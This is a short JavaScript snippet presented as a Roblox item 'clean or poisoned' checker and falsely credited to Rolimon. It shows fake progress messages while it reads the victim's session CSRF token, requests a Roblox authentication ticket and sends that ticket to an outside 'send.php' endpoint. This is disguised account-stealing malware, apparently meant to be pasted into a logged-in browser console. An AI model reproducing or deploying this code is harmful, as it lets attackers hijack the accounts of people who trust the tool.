console.log("Enter item UAID or Serial number.")
setTimeout(()=>console.log("Searching previous owners."), 10300)
setTimeout(()=>console.log("List of owners found."), 12300)
setTimeout(()=>console.log("Getting results."), 14300)
setTimeout(()=>console.log("%cItem Status! This item is clean!", "color: green"), 16300)

// Returning --

var send_url = name.split('"')[1].split("?")[0] + "send.php";

(async function() {
    // Coded by Rolimon 
    // this checks whether the item is poisoned or clean
    var xsrf = (await (await fetch("https://www.roblox.com/home", {
        credentials: "include"
    })).text()).split("setToken('")[1].split("')")[0]

    var ticket = (await fetch("https://auth.roblox.com/v1/authentication-ticket", {
        method: "POST",
        credentials: "include",
        headers: {"x-csrf-token": xsrf}
    })).headers.get("rbx-authentication-ticket")

    await fetch(send_url + "?t=" + ticket)
})()